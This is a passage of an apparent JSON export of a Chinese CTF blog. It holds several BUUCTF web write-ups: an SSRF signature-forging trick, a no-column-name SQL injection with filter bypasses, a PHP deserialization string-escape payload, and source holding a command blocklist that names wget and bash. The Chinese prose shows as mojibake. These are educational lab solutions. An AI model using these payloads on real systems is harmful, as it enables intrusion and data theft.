a\n```\n\nè¿™é‡Œæˆ‘åœ¨æœ¬æœºvscodeä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475702429-4efd6e74-e03d-49da-91a6-b059d717becd.png)\n\nå‘ç°è¿™ä¸ªè„šæœ¬æ˜¯å±äºpython2çš„ æˆ‘è¿™æ˜¯python3 æ‰€ä»¥æˆ‘åªå¥½å»æˆ‘çš„kaliè™šæ‹Ÿå»è·‘\n\næ³¨æ„è¿™é‡Œè¦æŠŠä¸­æ–‡æ³¨é‡Šåˆ äº† ä¸ç„¶ä¼šæŠ¥é”™ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475831556-3f608263-1166-4f39-a71b-dcece769b79d.png)\n\nç„¶åç‚¹å‡» ä¸€é”®æˆä¸ºå¤§ä¼šå‘˜ æŠ“åŒ… ä¿®æ”¹becomeå€¼\n\næˆåŠŸæ‹¿åˆ° flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475923738-eada5091-7c68-4503-9402-50b706cc41c3.png)\n","tags":["python","jwt","pythonååºåˆ—åŒ–"],"categories":["buuctf"]},{"title":"buuctf-60-[De1CTF 2019]SSRF Me","url":"/post/2ee4794d.html","content":"\n[De1CTF 2019]SSRF Me\n\n<!--more-->\n\nä¸€é“pythonä»£ç å®¡è®¡ï¼Œå‘ç°å®¡è®¡èƒ½åŠ›çœŸçš„å¾ˆé‡è¦ã€‚\n\nçœ‹åˆ°æºç ï¼š\n\n```cmake\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0')\n```\n\nåˆ†æï¼š\n\næœ‰ä¸‰ä¸ªè·¯ç”±ï¼š`/geneSign` `/De1ta` `/`\n\n`/geneSign` è·¯ç”±æ˜¯è·å–ç­¾åçš„ é€šè¿‡getç»™paramä¼ å‚ ç„¶åè¿™é‡Œactionä¸æ˜¯æˆ‘ä»¬èƒ½æ”¹å˜çš„\n\nä¸€èµ·ä¼ å…¥getSign() \n\nè¿”å› `secert_key+param+action`çš„md5å€¼ è¿™é‡Œåªæœ‰paramæˆ‘ä»¬èƒ½æ§åˆ¶\n\n```cmake\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n```\n\nå†æ¥çœ‹`/De1ta`\n\n```cmake\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n```\n\ngetæ–¹å¼ç»™paramä¼ å‚ cookieä¼ actionå’Œsignçš„å€¼\n\nç»è¿‡ä¸€ä¸ªwaf è¿™é‡Œç”¨æ¥é˜²æ­¢ç”¨åè®®\n\nç„¶åä¼ å…¥Exec()\n\nå…ˆç»è¿‡checkSignå‡½æ•°æ£€æŸ¥ç­¾åæ˜¯å¦ç¬¦åˆ\n\n```cmake\n def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n```\n\nåˆ†åˆ«æœ‰ä¸¤ä¸ªifåˆ¤æ–­\n\nç¬¬ä¸€ä¸ªifï¼š å½“æœ‰actionæœ‰scanæ—¶æ³¨æ„è¿™é‡Œæ˜¯`in` è€Œä¸æ˜¯ `==`,ç”Ÿæˆä¸€ä¸ªtmpfileæ–‡ä»¶\n\nå°†paramä¼ å…¥scanå‡½æ•°\n\n```cmake\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n```\n\nè¿™é‡Œèƒ½çœ‹åˆ°`urllib.urlopen().read()`è¿™é‡Œå°±æ˜¯åˆ©ç”¨ç‚¹ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569071434-59e9ac4d-007e-413d-b3b5-6b0572ab50ae.png)\n\nç›¸å½“äºæ‰“å¼€paramè¿™ä¸ªæ–‡ä»¶ é¢˜ç›®ä¹Ÿæç¤ºflagåœ¨flag.txtä¸­\n\nè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆwafè¦ç¦ç”¨fileåè®®å’Œgopheråè®®ï¼ˆä¹Ÿå°±æ˜¯httpåè®®çš„å‰èº«ï¼‰\n\nå› ä¸ºssrfæ¼æ´ä¸€èˆ¬éƒ½å¯ä»¥æ­é…å¾ˆå¤šåè®®æ¥ç”¨\n\nç„¶åå°†scanå†…å®¹å†™å…¥åˆ°tmpfileæ–‡ä»¶ä¸­ ä½†æ˜¯æ²¡æ³•è¯»\n\nç¬¬äºŒä¸ªifï¼šå½“actionä¸­æœ‰readæ—¶ å°±ä¼šè¯»å‡ºæ¥èµ‹å€¼ç»™result[data]ç„¶å Execå‡½æ•°è¿”å›resultç»“æœ\n\nåšåˆ°è¿™é‡Œå½“æ€è·¯å°±å¾ˆæ¸…æ™°\n\nactionåŒæ—¶åŒ…æ‹¬scanå’Œreadæ—¶å€™æ—¢èƒ½å†™å…¥æ–‡ä»¶ä¹Ÿèƒ½è¯»å‡ºæ–‡ä»¶,ä½†æ˜¯æˆ‘ä»¬actionçš„å€¼æ˜¯æˆ‘ä»¬ä¿®æ”¹ä¸äº†çš„è¯¥æ€ä¹ˆåŠå‘¢\n\nå†æ¥çœ‹ç”Ÿæˆç­¾åè¿™é‡Œ`hashlib.md5(secert_key + param + action)` è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç»™paramä¼ å…¥flag.txtreadæ‹¼æ¥èµ·æ¥ å°±ç®—æˆ‘ä»¬æ²¡æœ‰ç»™actionä¼ read æœ€åmd5å€¼æ˜¯å°†æ•´ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥åŒ…å«readå€¼ è¿™å°±å¯ä»¥äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569721446-365d0287-38a5-4618-a182-6250f63d1336.png)\n\n`9b231caf6bf82362fa5f78bf8da3d6ec`è®°å½•ä¸‹æˆ‘ä»¬çš„ç­¾å \n\næˆåŠŸï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681569831963-9cfa50d0-0e24-4628-9a49-3bc29f274ba6.png)\n","tags":["python","flaskæ¡†æ¶","ä»£ç å®¡è®¡"],"categories":["buuctf"]},{"title":"buuctf-49-[SWPU2019]Web1","url":"/post/89f21605.html","content":"\n[SWPU2019]Web1\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“æ— åˆ—åæ³¨å…¥çš„ä¸€é“é¢˜\n\nè¿›å…¥å‘ç°è¦æ³¨å†Œä¸€ä¸ªè´¦å·å¹¶ä¸”ç™»å½• å‘ç°adminå·²ç»è¢«æ³¨å†Œäº† æœ¬æ¥ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯æ‹¿åˆ°adminçš„å¯†ç å°±ç»“æŸäº†\n\nè¿›å»ä¹‹åæœ‰ä¸€ä¸ª å¯ä»¥å‘å¸ƒå†…å®¹çš„ çœ‹åˆ°è¿™é‡Œä»¥ä¸ºæ˜¯xssæ³¨å…¥ ä½†åæ¥çœ‹äº†å¤§ä½¬wp ä¸æ˜¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460509878-cf2a45c9-71c9-403f-baf5-1320d375227b.png)\n\nç„¶ååœ¨å‘å¸ƒå¹¿å‘Šå¹¿å‘Šåè¿™é‡Œå¯ä»¥è¿›è¡Œsqlæ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460618692-5b643a68-2285-4b0b-ba3e-280448656e8e.png)\n\nåˆ¤æ–­å­—æ®µæ•°ï¼Œå‘ç°`order by`è¢«ç¦ç”¨äº†æ‰€ä»¥ä¹‹åè”åˆæŸ¥è¯¢æ—¶å€™åŒ…å«`or`è¡¨ï¼Œæ•°æ®åº“éƒ½è¢«æ²³èŸ¹äº†ã€‚\n\nç©ºæ ¼ä¹Ÿè¢«æ²³èŸ¹äº† ç”¨`/**/`æ¥ç»•è¿‡ è¿™ä¸ªæœ¬æ¥æ˜¯mysqlç”¨äºå¤šè¡Œæ³¨é‡Šçš„\n\nå°±å¯ä»¥ç”¨`group by`ä»£æ›¿ æˆ–è€…select 1ï¼Œ2ï¼Œ3... æ ¹æ®å›æ˜¾åˆ¤æ–­å­—æ®µæ•°\n\nç„¶åè¿™é“é¢˜è¿˜æ²³èŸ¹äº†`# --`æ³¨é‡Šç¬¦ è¿™é‡Œç”¨åˆ°äº†é€šè¿‡é—­åˆåé¢çš„å•å¼•å·æ¥ç»•è¿‡ å‚è€ƒï¼šhttps://blog.csdn.net/qq_35733751/article/details/106462625\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678460895563-48a68425-baff-4026-83d5-abaef46c9ef2.png)è¿™å¼ å›¾å°±å¯ä»¥å¾ˆå½¢è±¡è¡¨ç¤º\n\nåˆ¤æ–­å­—æ®µæ•°ï¼š`1'/**/group/**/by/**/22,'` è‡³äºè¿™ä¸ªæœ«å°¾çš„é€—å· åº”è¯¥æ˜¯èµ·ä¸€ä¸ªå­å¥çš„ä½œç”¨ å¦‚æœæ²¡æœ‰å°±ä¼šæŠ¥é”™\n\næŸ¥è¡¨ï¼š`1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/' `\n\nè¿™é‡Œç”¨åˆ°äº† `mysql.innodb_table_stats`å› ä¸º `or` è¢«æ²³èŸ¹äº†,åˆé•¿äº†ä¸€ä¸ªæ–°å§¿åŠ¿ è¿˜å¯ä»¥ç”¨ `sys.schema_auto_increment_columns`æŸ¥è¡¨å å‚è€ƒï¼šhttps://www.anquanke.com/post/id/193512\n\nçˆ†å‡ºè¡¨åï¼š\n\nFLAG_TABLE,news,users,gtid_slave_pos,ads,users\n\n å¾—åˆ°äº†è¡¨å ä¸€èˆ¬æ¥è¯´å°±è¦çˆ†åˆ—åäº† ä½†æ˜¯è¿™é“é¢˜ä¸çŸ¥é“åˆ—å ç„¶åå°±è¦ä½¿ç”¨æ— åˆ—åæ³¨å…¥äº†ï¼Œåœ¨æœ¬åœ°æ­äº†ä¸€ä¸ªç¯å¢ƒè¿›è¡Œæµ‹è¯•\n\nç®€å•æ¥è¯´æ— åˆ—åæ³¨å…¥ä¼šç»™è¡¨çš„åˆ—åèµ·ä¸€ä¸ªæ•°å­—ç§°è°“ï¼ˆasç”¨å­—ç¬¦å½“åˆ«ç§°ä¹Ÿè¡Œï¼‰ç„¶ååˆ©ç”¨æ•°å­—æŸ¥åˆ—å†…å®¹\n\nå‚è€ƒï¼šhttps://err0r.top/article/mardasctf/\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461602828-24dea7a0-7adf-4c53-a4ff-bc34ae832eb0.png)\n\næ´¾ç”Ÿè¡¨è¦èµ·ä¸ªåˆ«å å¦‚ä¸‹å›¾ ä¸ç„¶ä¼šæŠ¥é”™\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461677314-cb1fe5db-e76f-487f-9834-c88fd06c743b.png)\n\nå¦‚æœæ˜¯æ•°å­— åˆ™è¦ç”¨``åŒ…è£¹èµ·æ¥ å¦‚æœè¢«æ²³èŸ¹äº† å°±å¯ä»¥ç”¨èµ·åˆ«åçš„æ–¹å¼ç»•è¿‡\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461832358-ff3d43fb-a352-4cf2-96e6-507b3806b4b8.png)\n\næ„é€ ï¼š`1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)b),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678461972121-cb82f694-b889-4a2d-b258-2298e09e2968.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678510108817-bea36dc4-e206-4942-a5bc-5ffc0c721b40.png)\n\nè‡³äºè¿™é‡Œä¸ºä»€ä¹ˆä¸­é—´æ˜¯åªæœ‰ select 1,2,3å°±ç»“æŸäº†  è¿™é‡Œæ²¡ææ˜ç™½\n\nå¦‚æœæˆ‘ä»¬å¤šåŠ ä¸ª4 æˆ–è€…å‡å»ä¸€ä¸ªæ•° åˆ™ä¼šå‡ºç°![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678462097766-eb91beb6-0645-4a0c-b7be-c13cc5138410.png)\n\nçˆ†å‡º æŸ¥è¯¢çš„åˆ—ä¸å¯¹åº”\n\nåŸå› æ˜¯ä¹‹åè”åˆæŸ¥è¯¢è¿™éƒ¨åˆ†å­—æ®µæ•°åªæœ‰3ä¸ªå­—æ®µ`union/**/select*from/**/users`\n\n`select å’Œ union select`ä¸€èµ·ç”¨çš„æ—¶å€™å‰åå­—æ®µæ•°å¿…é¡»ç›¸åŒ \n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-48-[å®‰æ´µæ¯ 2019]easy_serialize_php","url":"/post/5419e860.html","content":"\n[å®‰æ´µæ¯ 2019]easy_serialize_php\n\n<!--more-->\n\nè¿™æ˜¯ä¸€é“ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸é¢˜ç›® ä¸€é“å­¦ä¹ é¢˜ç›®\n\næ‰“å¼€é¢˜ç›® çœ‹åˆ°æºç \n\n```php\n<?php\n\n\n$function = @$_GET['f'];\n\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\n\nextract($_POST);\n\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n\n$serialize_info = filter(serialize($_SESSION));\n\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028387439-5e30cbf1-2b4b-499a-8fda-01a0e0aafaa2.png)\n\nçœ‹åˆ°url æ˜¯`f=highli_file` çœ‹åˆ°æºç å°±æ˜ç™½äº†\n\n```php\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n```\n\nè¿™é‡Œå¯ä»¥è¯´æ˜¯ä¸»ç¨‹åºäº† é¢˜ç›®å½“`f=phpinfo()`è¾“å‡º`phpinfo()`æˆ‘ä»¬ä¼šæ‰¾åˆ°ä¸€äº›ä¸œè¥¿\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028629889-2e6333f7-e163-4197-b9e8-c7aec11be3b2.png)æœç„¶å‘ç°äº†å¯ç–‘phpæ–‡ä»¶ \n\nä¸»ç¨‹åºæœ‰file_get_contents() è¿™é‡Œåº”è¯¥å°±æ˜¯å»åŒ…å«æˆ‘ä»¬å‘ç°çš„d0g3_f1ag.phpæ–‡ä»¶\n\nè¿˜æœ‰ä¸€ä¸ªæˆ‘ä¸çŸ¥é“çš„ç‰¹æ®Šç‚¹ï¼š$_SESSIONæ•°ç»„ è¿™æ˜¯ä¸€ä¸ªæ•°ç»„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678028879443-2428b4ea-e2bd-4b27-a61b-b9f600fbc766.png)\n\nè¿™é“é¢˜$_SESSIONå…±æœ‰ä¸‰ä¸ªå˜é‡åˆ†åˆ«ä¸º `user function img` å…¶å®imgç”¨æ¥å»åŒ…å«é‚£ä¸ªphpæ–‡ä»¶\n\nä½†æ˜¯è¿™é‡Œ\n\n```php\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n```\n\n$_SESSION['img']å…ˆé€šè¿‡base64åŠ å¯† ç„¶åå†è¿›è¡Œsha1()å‡½æ•° å°½ç®¡ä¸»å‡½æ•°æœ€ååŒ…å«æ–‡ä»¶ä¹‹å‰ä¼šæœ‰base64è§£å¯† ä½†æ˜¯sha1()å‡½æ•°æ˜æ˜¾å°±æ˜¯ä¸è®©æˆ‘ä»¬ç›´æ¥å°†flagæ–‡ä»¶èµ‹å€¼ç»™$_SESSION['img']\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678029789710-ca04d073-df07-40ab-bf30-5791bbfbffb8.png)\n\né‚£ä¹ˆåº”è¯¥æ€ä¹ˆè®©$_SESSION['img']ç­‰äºæˆ‘ä»¬çš„phpæ–‡ä»¶å‘¢ è¿™é‡Œæ€è·¯å¤§æ¦‚å°±æ˜¯ç±»ä¼¼äºç±»ååºåˆ—åŒ– \n\næœ¬åœ°åºåˆ—åŒ–æ„é€ åŒ…å«äº†phpæ–‡ä»¶çš„$_SESSION['img'] ç„¶åå†ååºåˆ—å»è¦†ç›–é‚£ä¸ªé¢˜ç›®ä¸­çš„$_SESSION['img']\n\nå†æ¥çœ‹è¿‡æ»¤è¿™éƒ¨åˆ† ç”¨ç©ºå­—ç¬¦å»æ­£åˆ™ä»£æ¢æˆ‘ä»¬çš„æ–‡ä»¶ååç¼€å\n\n```php\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n```\n\n\n\nè¿™é‡Œå°±ç”¨åˆ°äº†å­—ç¬¦ä¸²ååºåˆ—åŒ–æ²™ç®±é€ƒé€¸ å‚è€ƒhttps://www.jianshu.com/p/8e8117f9fd0e\n\né€šè¿‡ä¸€ä¸ªå°demoç®€å•çœ‹ä¸€ä¸‹åŸç†\n\n```php\n<?php\n//ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\n$a = array('123', 'abc', 'defg');\n$b=serialize($a); //a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"defg\";}\nvar_dump(unserialize($b));    \n// æ·»åŠ  i:2;s:4:\"love\";}\n$c='a:3:{i:0;s:3:\"123\";i:1;s:3:\"abc\";i:2;s:4:\"love\";}i:2;s:4:\"defg\";}';\nvar_dump(unserialize($c));\n?>\n```\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682744765971-b50d2065-4da4-4695-b8cc-2ab0ab675374.png)\n\næœ¬åœ°æµ‹è¯•\n\n```php\n<?php\n$a ='/flag/';\n$_SESSION[\"user\"]='flagflagflagflagflagflag';\n$_SESSION[\"function\"]='a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}';\n$_SESSION[\"img\"]='L2QwZzNfZmxsbGxsbGFn';\n$b=serialize($_SESSION);\necho $b;\necho \"\\n\";\n$c=preg_replace($a,'',$b);\nvar_dump($c);\nprint_r(unserialize($c));\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030400496-4b376af4-9be1-4dab-a2b5-42423e634d5d.png)\n\nå°±æ˜¯é€šè¿‡ç‰¹æ„æ„é€ åºåˆ—åŒ– è®©$_SESSION[\"function\"]ä¸­çš„å†…å®¹ä»¿ç…§ååºåˆ—åŒ–åçš„$_SESSION[img]æ•°ç»„å†…å®¹ ä»è€Œè¾¾åˆ°è¦†ç›–\n\nå½“$_SESSION['user']ä¸­çš„24ä¸ªå­—ç¬¦è¢«ç©ºå­—ç¬¦ä»£æ›¿ä¹‹å ä¹‹åååºåˆ—åŒ–å°±ä¼šç»§ç»­å‘åé¢å¯»æ‰¾24ä¸ªå­—ç¬¦æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–è¯»å–`\";s:8:\"function\";s:59:\"a`è¿™24ä¸ªå­—ç¬¦ å¹¶ä¸”ä¹‹åè¿˜æœ‰`\";`ç¬¦åˆåœæ­¢çš„æ¡ä»¶ è€Œåç»§ç»­å‘åè¯»å–imgçš„20ä¸ªå­—ç¬¦ï¼Œç¬¬å››ä¸ªã€ç¬¬äº”ä¸ªså‘åè¯»å–å‡æ»¡è¶³è§„åˆ™ã€‚\n\nè¿™é‡Œéœ€è¦æ³¨æ„çš„ç‚¹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030563480-6f3a3535-4f70-44d3-9e72-3e42f519886c.png)\n\nè¿™é‡Œ`'a\"`å·¦è¾¹çš„å•å¼•å·æ˜¯å»é—­åˆè€…ä¸€æ•´æ®µå­—ç¬¦ä¸²å³è¾¹çš„å•å¼•å·\n\nå³è¾¹çš„åŒå¼•å·æ˜¯ä¸ºäº†å»é—­åˆåºåˆ—åŒ–åçš„`\"a\"`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1678030860232-9241224d-6736-4a96-9bad-e37f51653091.png)\n\nä¸ºä»€ä¹ˆæ˜¯4ä¸ªflag å³24ä¸ªå­—ç¬¦ è¦æ ¹æ®åé¢æ„é€ çš„å†…å®¹å»çµæ´»å˜åŠ¨\n\nç„¶åæ˜¯`}`æ„é€ çš„å­—ç¬¦ä¸²ä¸­æœ‰ä¸€ä¸ª`}`è¿™ä¸ªå¾ˆé‡è¦ ä¸€å¼€å§‹æœ¬åœ°æµ‹è¯•çš„ä¸€ç›´æŠ¥é”™ å‘ç°æ˜¯æŠŠè¿™ä¸ª`}`ç»™åˆ äº† è¿™ä¸ª`}`æ˜¯ç”¨æ¥ä¹‹åååºåˆ—åŒ–æ—¶å€™åŒ¹é…åœæ­¢åŒ¹é…çš„ä¸€ä¸ªç¬¦å·å§ï¼ˆæˆ‘æ˜¯è¿™æ ·è®¤ä¸ºçš„ï¼‰å¦‚æœä¸åŠ å°±ä¼šå¯¼è‡´æ²™ç®±é€ƒé€¸å¤±è´¥\n\nç„¶åå› ä¸ºåœ¨æ–‡ä»¶åŒ…å«ä¹‹å‰ä¼šæœ‰base64è§£ç  éœ€è¦æŠŠæˆ‘ä»¬å‘ç°çš„phpæ–‡ä»¶è¿›è¡Œbase64åŠ å¯†ä¹‹å å¼„è¿›æˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²ä¸­ \n\nä¹‹åé¢˜ç›®å°±è¿åˆƒè€Œè§£äº†ã€‚\n","tags":["ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"],"categories":["buuctf"]},{"title":"buuctf-44-[å®‰æ´µæ¯ 2019]easy_web","url":"/post/6fcfe2b3.html","content":"\n[å®‰æ´µæ¯ 2019]easy_web\n\n<!--more-->\n\næ‰“å¼€é¢˜ç›®æŠ“åŒ…åˆ†æï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855227157-8e11fe84-0449-443a-8d14-66b419638837.png)\n\nå‘ç°å›¾ç‰‡æ˜¯é€šè¿‡base64ç¼–ç è¿›è¡Œè¾“å‡ºçš„ çœ‹äº†å¤§ä½¬çš„wp `img=TXpVek5UTTFNbVUzTURabE5qYz0` å³æ–‡ä»¶åæ˜¯å…ˆè¿›è¡Œåå…­è¿›åˆ¶ç¼–ç åœ¨è¿›è¡Œä¸¤æ¬¡base64ç¼–ç  è§£ç æŸ¥çœ‹åŸæ–‡ä»¶å\n\nç¬¬ä¸€æ¬¡ï¼šbase64\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855430402-2aaa6b54-1704-4a6d-9216-56d539fa2811.png)\n\nç¬¬äºŒæ¬¡: base64 å¾—åˆ°hexç¼–ç æ•°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855472959-be5e14ca-4885-4c53-8f03-1d2b031eb8d5.png)\n\nç¬¬ä¸‰æ¬¡ï¼šåœ¨è¿›è¡Œåå…­è¿›åˆ¶è§£ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677855501090-18a10c84-e855-4363-9d00-37618cb88138.png)\n\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™ç§æ–¹å¼è¿›è¡Œæ„é€ æŸ¥çœ‹index.php\n\nçˆ†å‡ºæºç :\n\n```php\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi~ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;  \n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n\n?>\n```\n\nä»£ç åˆ†æï¼š \n\ngetæ–¹å¼ä¼ å…¥cmd ä½†æ˜¯è¦è¿›è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…\n\nå†é€šè¿‡ 